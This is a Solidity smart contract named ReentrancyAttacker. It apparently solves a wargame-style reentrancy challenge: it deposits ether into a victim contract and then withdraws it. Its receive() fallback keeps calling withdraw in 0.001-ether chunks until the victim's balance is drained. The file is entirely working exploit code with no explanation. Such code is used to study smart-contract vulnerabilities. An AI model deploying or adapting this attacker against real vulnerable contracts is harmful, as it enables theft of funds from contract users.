// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IReenterance {
    function donate(address _to) external payable;
    function withdraw(uint256 amount) external;
}

contract ReentrancyAttacker {
    IReenterance victim;

    constructor(address _victim) {
        victim = IReenterance(_victim);
    }

    function attack() external payable {
        victim.donate{value: msg.value}(address(this));
        victim.withdraw(msg.value);
    }

    receive() external payable {
      uint targetBal = address(victim).balance;
        if (targetBal >= 0.001 ether) {
            victim.withdraw(0.001 ether);
        }
    }
}
// 1000000000000000